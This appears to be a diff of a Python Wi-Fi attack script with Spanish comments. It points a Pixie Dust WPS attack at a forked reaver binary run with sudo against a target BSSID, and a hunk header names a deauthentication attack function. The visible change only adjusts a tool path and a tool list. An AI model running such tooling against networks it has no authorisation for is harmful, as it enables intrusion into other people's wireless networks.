@@ -65,7 +65,8 @@ def deauth_attack(bssid):
 def perform_pixie_dust_attack(bssid):
     """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
+    reaver_path = "~/reaver-wps-fork-t6x/src/reaver"
+    stdout, stderr = run_command(f"{reaver_path} -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
 
     if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
         print("Información obtenida para Pixie Dust:")
@@ -97,7 +98,7 @@ def perform_pixie_dust_attack(bssid):
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["airodump-ng", "aireplay-ng", "reaver", "pixiewps"]
+    tools = ["airodump-ng", "aireplay-ng", "pixiewps"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
